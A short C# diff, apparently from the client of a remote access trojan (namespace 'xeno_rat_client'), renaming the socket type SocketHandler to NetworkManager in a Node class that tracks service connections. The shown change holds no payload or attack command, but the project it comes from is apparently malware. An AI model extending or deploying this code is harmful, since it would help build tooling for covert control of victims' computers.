@@ -15,12 +15,12 @@ namespace xeno_rat_client
         
         private Action<Node> HandleServiceStop;
         public List<Node> serviceConnections = new List<Node>();
-        public SocketHandler sock;
+        public NetworkManager sock;
         public Node Parent;
         public int ID = -1;
         public int SetId = -1;
         public int connectionType = -1;
-        public Node(SocketHandler _sock, Action<Node> _HandleServiceStop)
+        public Node(NetworkManager _sock, Action<Node> _HandleServiceStop)
         {
             sock = _sock;
             HandleServiceStop = _HandleServiceStop;
